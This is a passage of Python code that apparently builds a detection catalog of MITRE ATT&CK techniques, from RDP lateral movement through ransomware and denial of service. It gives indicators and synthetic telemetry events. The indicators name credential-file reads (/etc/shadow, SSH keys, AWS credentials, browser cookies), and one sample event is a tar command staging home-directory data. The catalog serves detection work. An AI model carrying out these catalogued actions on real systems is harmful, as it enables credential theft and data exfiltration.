        technique_name="Remote Services: Remote Desktop Protocol",
        tactic="Lateral Movement",
        description="Adversaries may use Valid Accounts to log into remote systems using RDP."
    )
    t1021_001.add_implementation(TechniqueImplementation(
        technique_id="T1021.001",
        technique_name="Remote Services: Remote Desktop Protocol",
        tactic="Lateral Movement",
        implementation_id="T1021.001-IMPL-01",
        vector_name="rdp_inbound_external_connection",
        description="RDP connection to port 3389 originating from non-internal source IP address",
        execution_modality="network_flow",
        required_telemetry_fields=["dst_endpoint.port", "src_endpoint.ip", "enrichment.is_private"],
        detection_indicators=["dst_port=3389", "is_private=False"],
        sample_event={
            "ocsf_class": "network_activity",
            "dst_endpoint": {"port": 3389, "ip": "10.0.0.50"},
            "src_endpoint": {"ip": "198.51.100.15"},
            "enrichment": {"is_private": False},
        },
        mutations=[
            {"src_endpoint": {"ip": "203.0.113.120"}, "dst_endpoint": {"port": 3389}},
        ]
    ))
    t1021_001.add_implementation(TechniqueImplementation(
        technique_id="T1021.001",
        technique_name="Remote Services: Remote Desktop Protocol",
        tactic="Lateral Movement",
        implementation_id="T1021.001-IMPL-02",
        vector_name="rdp_tunnel_over_ssh_socks",
        description="RDP session tunneled through localhost port forward or encrypted SOCKS proxy",
        execution_modality="encrypted_session",
        required_telemetry_fields=["network.tunnel_type", "flow.inner_protocol", "dst_endpoint.port"],
        detection_indicators=["ssh_port_forward", "socks_proxy_rdp"],
        sample_event={
            "ocsf_class": "network_activity",
            "dst_endpoint": {"port": 12701, "ip": "127.0.0.1"},
            "traffic": {"bytes": 45000},
        },
        mutations=[]
    ))
    catalog.register_technique(t1021_001)

    # =========================================================================
    # 8. TACTIC: COLLECTION
    # =========================================================================
    # T1005 - Data from Local System
    t1005 = TechniqueDefinition(
        technique_id="T1005",
        technique_name="Data from Local System",
        tactic="Collection",
        description="Adversaries may search local system sources, such as file systems and databases, to find files of interest."
    )
    t1005.add_implementation(TechniqueImplementation(
        technique_id="T1005",
        technique_name="Data from Local System",
        tactic="Collection",
        implementation_id="T1005-IMPL-01",
        vector_name="sensitive_credential_file_access",
        description="Direct unauthorized read access to /etc/shadow, id_rsa, or AWS credentials files",
        execution_modality="file_system",
        required_telemetry_fields=["file.path", "file.action", "actor.user.name"],
        detection_indicators=["/etc/shadow", "id_rsa", ".aws/credentials", "sensitive_path"],
        sample_event={
            "ocsf_class": "file_activity",
            "file": {"path": "/etc/shadow", "action": "read"},
            "actor": {"user": {"name": "appuser"}},
        },
        mutations=[
            {"file": {"path": "/home/user/.ssh/id_rsa", "action": "read"}},
            {"file": {"path": "/root/.aws/credentials", "action": "read"}},
        ]
    ))
    t1005.add_implementation(TechniqueImplementation(
        technique_id="T1005",
        technique_name="Data from Local System",
        tactic="Collection",
        implementation_id="T1005-IMPL-02",
        vector_name="in_memory_browser_cookie_sqlite_access",
        description="Direct extraction of browser cookies and session keys from locked SQLite databases",
        execution_modality="file_system",
        required_telemetry_fields=["process.cmd", "file.path", "file.lock_override"],
        detection_indicators=["Cookies.sqlite", "Login Data"],
        sample_event={
            "ocsf_class": "file_activity",
            "file": {"path": "/home/user/.config/google-chrome/Default/Cookies"},
        },
        mutations=[]
    ))
    catalog.register_technique(t1005)

    # T1074 - Data Staged
    t1074 = TechniqueDefinition(
        technique_id="T1074",
        technique_name="Data Staged",
        tactic="Collection",
        description="Adversaries may stage collected data in a central location or directory prior to exfiltration."
    )
    t1074.add_implementation(TechniqueImplementation(
        technique_id="T1074",
        technique_name="Data Staged",
        tactic="Collection",
        implementation_id="T1074-IMPL-01",
        vector_name="tar_gzip_staging_in_tmp",
        description="Creating compressed tar/zip archives of user home directories in /tmp or /var/tmp",
        execution_modality="host_cli",
        required_telemetry_fields=["process.cmd", "process.name", "actor.user.name"],
        detection_indicators=["tar -czf /tmp", "zip -r /tmp"],
        sample_event={
            "ocsf_class": "process_activity",
            "process": {"name": "tar", "cmd": "tar -czf /tmp/staged_data.tar.gz /home/user/documents", "pid": 5510},
        },
        mutations=[]
    ))
    t1074.add_implementation(TechniqueImplementation(
        technique_id="T1074",
        technique_name="Data Staged",
        tactic="Collection",
        implementation_id="T1074-IMPL-02",
        vector_name="ntfs_alternate_data_stream_staging",
        description="Staging stolen archives hidden within NTFS Alternate Data Streams (ADS)",
        execution_modality="file_system",
        required_telemetry_fields=["file.path", "file.stream_name", "file.action"],
        detection_indicators=["file.txt:hidden_stream", "ads_write"],
        sample_event={
            "ocsf_class": "file_activity",
            "file": {"path": "C:\\temp\\readme.txt:staged.zip", "action": "write"},
        },
        mutations=[]
    ))
    catalog.register_technique(t1074)

    # =========================================================================
    # 9. TACTIC: COMMAND AND CONTROL
    # =========================================================================
    # T1071.001 - Web Protocols C2
    t1071_001 = TechniqueDefinition(
        technique_id="T1071.001",
        technique_name="Application Layer Protocol: Web Protocols",
        tactic="Command and Control",
        description="Adversaries may communicate using application layer protocols associated with web traffic (HTTP/HTTPS)."
    )
    t1071_001.add_implementation(TechniqueImplementation(
        technique_id="T1071.001",
        technique_name="Application Layer Protocol: Web Protocols",
        tactic="Command and Control",
        implementation_id="T1071.001-IMPL-01",
        vector_name="c2_periodic_beaconing_fixed_interval",
        description="Periodic C2 beaconing on port 80/443 exhibiting low inter-arrival variance and high correlation",
        execution_modality="network_flow",
        required_telemetry_fields=["dst_endpoint.port", "traffic.interval_variance", "enrichment.is_known_c2"],
        detection_indicators=["c2_beacon", "threat_intel_hit", "dst_port=443"],
        sample_event={
            "ocsf_class": "network_activity",
            "dst_endpoint": {"port": 443, "ip": "198.51.100.99"},
            "src_endpoint": {"ip": "10.0.0.15"},
            "traffic": {"interval_variance": 0.02, "packets": 40},
            "enrichment": {"is_known_c2": True},
        },
        mutations=[
            {"dst_endpoint": {"port": 80}, "traffic": {"interval_variance": 0.04}},
            {"enrichment": {"is_known_c2": True}},
        ]
    ))
    t1071_001.add_implementation(TechniqueImplementation(
        technique_id="T1071.001",
        technique_name="Application Layer Protocol: Web Protocols",
        tactic="Command and Control",
        implementation_id="T1071.001-IMPL-02",
        vector_name="jittered_c2_beacon_with_random_uri",
        description="High-jitter HTTP beaconing with randomized sleeping intervals (0-120s) and domain fronting",
        execution_modality="network_flow",
        required_telemetry_fields=["http.request.uri", "http.request.headers", "dns.query_name"],
        detection_indicators=["domain_fronting", "uri_entropy"],
        sample_event={
            "ocsf_class": "network_activity",
            "dst_endpoint": {"port": 443, "ip": "151.101.65.140"},
            "traffic": {"interval_variance": 18.5, "packets": 8},
        },
        mutations=[]
    ))
    catalog.register_technique(t1071_001)

    # T1573.002 - Encrypted Channel: Asymmetric Cryptography
    t1573_002 = TechniqueDefinition(
        technique_id="T1573.002",
        technique_name="Encrypted Channel: Asymmetric Cryptography",
        tactic="Command and Control",
        description="Adversaries may employ asymmetric cryptography for command and control channel encryption."
    )
    t1573_002.add_implementation(TechniqueImplementation(
        technique_id="T1573.002",
        technique_name="Encrypted Channel: Asymmetric Cryptography",
        tactic="Command and Control",
        implementation_id="T1573.002-IMPL-01",
        vector_name="encrypted_session_beaconing",
        description="Encrypted TLS session exhibiting regular periodic timing and high packet size symmetry",
        execution_modality="encrypted_session",
        required_telemetry_fields=["flow.packet_lengths", "flow.inter_arrival_times", "dst_endpoint.port"],
        detection_indicators=["mean_iat >= 0.8", "iat_std < 0.25", "c2_beaconing"],
        sample_event={
            "ocsf_class": "encrypted_session",
            "flow_id": "c2-tls-001",
            "dst_endpoint": {"port": 443},
            "packet_lengths": [128, 128, 128, 128, 128, 128, 128, 128],
            "inter_arrival_times": [1.02, 0.99, 1.01, 1.00, 1.03, 0.98, 1.01],
        },
        mutations=[
            {"inter_arrival_times": [1.05, 1.01, 0.96, 1.02, 1.03, 0.97]},
            {"packet_lengths": [136, 136, 136, 136, 136, 136]},
        ]
    ))
    t1573_002.add_implementation(TechniqueImplementation(
        technique_id="T1573.002",
        technique_name="Encrypted Channel: Asymmetric Cryptography",
        tactic="Command and Control",
        implementation_id="T1573.002-IMPL-02",
        vector_name="encrypted_session_interactive_shell",
        description="Encrypted TLS interactive reverse shell characterized by rapid sub-second keystroke packet bursts",
        execution_modality="encrypted_session",
        required_telemetry_fields=["flow.packet_lengths", "flow.inter_arrival_times"],
        detection_indicators=["mean_iat < 0.8", "small_keystroke_packets", "interactive_shell"],
        sample_event={
            "ocsf_class": "encrypted_session",
            "flow_id": "shell-tls-002",
            "dst_endpoint": {"port": 8443},
            "packet_lengths": [48, 52, 48, 60, 50, 48, 52, 70],
            "inter_arrival_times": [0.12, 0.18, 0.25, 0.09, 0.15, 0.20, 0.11],
        },
        mutations=[
            {"inter_arrival_times": [0.15, 0.22, 0.18, 0.14, 0.19, 0.16]},
        ]
    ))
    t1573_002.add_implementation(TechniqueImplementation(
        technique_id="T1573.002",
        technique_name="Encrypted Channel: Asymmetric Cryptography",
        tactic="Command and Control",
        implementation_id="T1573.002-IMPL-03",
        vector_name="tor_obfs4_pluggable_transport",
        description="Tor pluggable transport (obfs4) shaping TLS packets to appear like entropy noise",
        execution_modality="encrypted_session",
        required_telemetry_fields=["flow.entropy_profile", "flow.handshake_suppression"],
        detection_indicators=["obfs4_handshake", "entropy_noise"],
        sample_event={
            "ocsf_class": "encrypted_session",
            "flow_id": "tor-obfs-003",
            "packet_lengths": [1440, 1440, 1440],
        },
        mutations=[]
    ))
    catalog.register_technique(t1573_002)

    # =========================================================================
    # 10. TACTIC: IMPACT
    # =========================================================================
    # T1486 - Data Encrypted for Impact
    t1486 = TechniqueDefinition(
        technique_id="T1486",
        technique_name="Data Encrypted for Impact",
        tactic="Impact",
        description="Adversaries may encrypt data on target systems to interrupt availability and extort ransom."
    )
    t1486.add_implementation(TechniqueImplementation(
        technique_id="T1486",
        technique_name="Data Encrypted for Impact",
        tactic="Impact",
        implementation_id="T1486-IMPL-01",
        vector_name="ransomware_extension_rename",
        description="Mass renaming of user files with known ransomware extensions (.locked, .wncry, .crypto)",
        execution_modality="file_system",
        required_telemetry_fields=["file.path", "file.extension", "file.action"],
        detection_indicators=[".locked", ".crypto", ".wncry", "ransomware_extension"],
        sample_event={
            "ocsf_class": "file_activity",
            "file": {"path": "C:\\Users\\suyash\\financials.xlsx.locked", "action": "modify", "extension": ".locked"},
        },
        mutations=[
            {"file": {"path": "C:\\Data\\database.mdf.crypto", "action": "modify", "extension": ".crypto"}},
            {"file": {"path": "C:\\Shares\\report.doc.crypted", "action": "modify", "extension": ".crypted"}},
        ]
    ))
    t1486.add_implementation(TechniqueImplementation(
        technique_id="T1486",
        technique_name="Data Encrypted for Impact",
        tactic="Impact",
        implementation_id="T1486-IMPL-02",
        vector_name="ransomware_high_entropy_bulk_writes",
        description="Bulk file overwrite with encrypted high-entropy bytes (entropy >= 7.2)",
        execution_modality="file_system",
        required_telemetry_fields=["file.path", "file.entropy", "file.action"],
        detection_indicators=["entropy >= 7.2", "file_overwrite"],
        sample_event={
            "ocsf_class": "file_activity",
            "file": {"path": "C:\\Documents\\resume.docx", "entropy": 7.88, "action": "modify"},
        },
        mutations=[
            {"file": {"path": "C:\\Documents\\archive.tar", "entropy": 7.65}},
            {"file": {"path": "C:\\Documents\\backup.bak", "entropy": 7.95}},
        ]
    ))
    t1486.add_implementation(TechniqueImplementation(
        technique_id="T1486",
        technique_name="Data Encrypted for Impact",
        tactic="Impact",
        implementation_id="T1486-IMPL-03",
        vector_name="vss_in_place_database_page_encryption",
        description="In-place page-level database file encryption preserving file extensions and size",
        execution_modality="file_system",
        required_telemetry_fields=["file.partial_entropy", "file.io_offset", "file.action"],
        detection_indicators=["partial_page_entropy", "offset_scatter"],
        sample_event={
            "ocsf_class": "file_activity",
            "file": {"path": "C:\\SQL\\master.mdf", "action": "modify"},
        },
        mutations=[]
    ))
    catalog.register_technique(t1486)

    # T1498.001 - Direct Network Flood
    t1498_001 = TechniqueDefinition(
        technique_id="T1498.001",
        technique_name="Network Denial of Service: Direct Network Flood",
        tactic="Impact",
        description="Adversaries may direct volumetric packet floods at network interfaces to saturate bandwidth."
    )
    t1498_001.add_implementation(TechniqueImplementation(
        technique_id="T1498.001",
        technique_name="Network Denial of Service: Direct Network Flood",
        tactic="Impact",
        implementation_id="T1498.001-IMPL-01",
        vector_name="syn_flood_volumetric",
        description="High-frequency TCP SYN packet flood (>1000 pps) aimed at exhaustion of connection backlog",
        execution_modality="network_flow",
        required_telemetry_fields=["tcp_flags", "traffic.pps", "src_endpoint.ip"],
        detection_indicators=["SYN in flags", "pps >= 1000"],
        sample_event={
            "ocsf_class": "network_activity",
            "tcp_flags": ["SYN"],
            "traffic": {"pps": 1500, "packets": 45000},
            "src_endpoint": {"ip": "198.51.100.5"},
        },
        mutations=[
            {"traffic": {"pps": 3000}},
            {"traffic": {"pps": 1200}},
        ]
    ))
    t1498_001.add_implementation(TechniqueImplementation(
        technique_id="T1498.001",
        technique_name="Network Denial of Service: Direct Network Flood",
        tactic="Impact",
        implementation_id="T1498.001-IMPL-02",
        vector_name="udp_flood_packet_burst",
        description="High-volume UDP datagram flood (>3000 packets) targeting arbitrary ports",
        execution_modality="network_flow",
        required_telemetry_fields=["traffic.packets", "protocol_name"],
        detection_indicators=["protocol=UDP", "packets >= 3000"],
        sample_event={
            "ocsf_class": "network_activity",
            "protocol_name": "UDP",
            "traffic": {"packets": 4500, "bytes": 6300000},
            "src_endpoint": {"ip": "203.0.113.80"},
        },
        mutations=[
            {"traffic": {"packets": 5000}},
            {"traffic": {"packets": 8000}},
        ]
    ))
    t1498_001.add_implementation(TechniqueImplementation(
        technique_id="T1498.001",
        technique_name="Network Denial of Service: Direct Network Flood",
        tactic="Impact",
        implementation_id="T1498.001-IMPL-03",
        vector_name="dns_amplification_reflection",
        description="DNS amplification reflective denial of service producing large UDP payload (>100KB)",
        execution_modality="network_flow",
        required_telemetry_fields=["src_endpoint.port", "traffic.bytes"],
        detection_indicators=["src_port=53", "bytes >= 100000"],
        sample_event={
            "ocsf_class": "network_activity",
            "src_endpoint": {"port": 53, "ip": "8.8.8.8"},
            "dst_endpoint": {"port": 41200, "ip": "10.0.0.8"},
            "traffic": {"bytes": 150_000, "packets": 120},
        },
        mutations=[
            {"traffic": {"bytes": 350000}},
        ]
    ))
    catalog.register_technique(t1498_001)

    # T1499 - Endpoint Denial of Service
    t1499 = TechniqueDefinition(
        technique_id="T1499",
        technique_name="Endpoint Denial of Service",
        tactic="Impact",
        description="Adversaries may target application or OS resources to deny service to legitimate users."
    )
    t1499.add_implementation(TechniqueImplementation(
        technique_id="T1499",
        technique_name="Endpoint Denial of Service",
        tactic="Impact",
        implementation_id="T1499-IMPL-01",
        vector_name="slow_http_slowloris_exhaustion",
        description="Slowloris slow HTTP request holding open worker sockets via low bytes per packet (<20 bytes/pkt)",
        execution_modality="network_flow",
        required_telemetry_fields=["dst_endpoint.port", "traffic.bytes", "traffic.packets"],
        detection_indicators=["dst_port=80", "dst_port=443", "bytes/pkt < 20", "slow_http"],
        sample_event={
            "ocsf_class": "network_activity",
            "dst_endpoint": {"port": 80, "ip": "10.0.0.80"},
            "traffic": {"packets": 60, "bytes": 800},
            "src_endpoint": {"ip": "192.168.1.55"},
        },
        mutations=[
            {"dst_endpoint": {"port": 443}, "traffic": {"packets": 80, "bytes": 960}},
            {"traffic": {"packets": 100, "bytes": 1200}},
        ]
    ))
    t1499.add_implementation(TechniqueImplementation(
        technique_id="T1499",
        technique_name="Endpoint Denial of Service",
        tactic="Impact",
        implementation_id="T1499-IMPL-02",
        vector_name="http_volumetric_get_flood",
        description="High-volume HTTP GET request flood (>1000 pkts) targeting web application tier",
        execution_modality="network_flow",
        required_telemetry_fields=["dst_endpoint.port", "traffic.packets", "traffic.bytes"],
        detection_indicators=["dst_port=80", "packets >= 1000", "http_flood"],
        sample_event={
            "ocsf_class": "network_activity",
            "dst_endpoint": {"port": 80, "ip": "10.0.0.80"},
            "traffic": {"packets": 1400, "bytes": 180_000},
            "src_endpoint": {"ip": "192.168.1.66"},
        },
        mutations=[
            {"traffic": {"packets": 2500, "bytes": 350000}},
            {"dst_endpoint": {"port": 8080}, "traffic": {"packets": 1200, "bytes": 150000}},
        ]
    ))
    t1499.add_implementation(TechniqueImplementation(
        technique_id="T1499",
        technique_name="Endpoint Denial of Service",
        tactic="Impact",
        implementation_id="T1499-IMPL-03",
        vector_name="host_fork_bomb_process_exhaustion",
        description="Process table exhaustion via recursive fork bomb child spawning",
        execution_modality="host_cli",
        required_telemetry_fields=["process.rate_per_sec", "system.process_count"],
        detection_indicators=["fork_bomb", "rapid_process_exhaustion"],
        sample_event={
            "ocsf_class": "system_activity",
            "system": {"process_count": 32768, "rate": 5000},
        },
        mutations=[]
    ))
    catalog.register_technique(t1499)

    return catalog
